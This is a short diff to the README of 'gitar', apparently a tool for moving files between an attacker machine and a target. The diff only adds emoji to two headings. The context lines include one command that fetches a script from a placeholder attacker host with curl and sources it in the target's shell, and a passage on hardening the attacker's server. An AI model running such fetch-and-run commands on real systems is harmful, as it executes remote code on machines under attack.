@@ -37,7 +37,7 @@ On my target machine:
 
 The aim is to keep "target requirements" as fit as possible. Attacker machine requirements are not a big deal as we have plenty control over it and time to configure it.
 
-### Launch `gitar` server 
+### 🎸 Launch `gitar` server 
  
 #### (Attacker machine)
 
@@ -57,7 +57,7 @@ curl -s http://[attacker_ip:port]/alias > /tmp/alias && source /tmp/alias && rm 
 
  [`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files)
 
-### Secure launch of `gitar` server
+### 🐋 Secure launch of `gitar` server
 
  
 This is basicaly the same as launching `gitar` server. But as we expose our http server we become the prey. Hence we must harden a bit the server. To do this we launch `gitar` inside a container and use HTTPS.
